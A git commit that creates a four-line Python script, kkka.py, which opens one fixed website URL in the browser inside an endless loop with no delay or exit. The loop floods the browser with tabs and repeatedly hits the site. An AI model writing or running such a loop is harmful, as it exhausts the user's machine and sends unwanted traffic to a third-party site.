edd59255dc0c3a6aa47bf919a41238b48a9e6e2f
Bechebeche999 <92576929+Bechebeche999@users.noreply.github.com>
2021-10-31 06:28:05 -0800

    Create kkka.py

---
+++ kkka.py
@@ -0,0 +1,4 @@
+import webbrowser
+
+while True:
+	webbrowser.open('https://beta.exitus.me/?__cf_chl_managed_tk__=pmd_gGuJWiitSW3OVaTzdAExJ3ewmMfa4XtCFDkLb5XSE5I-1635689939-0-gqNtZGzNAyWjcnBszQZ9') 
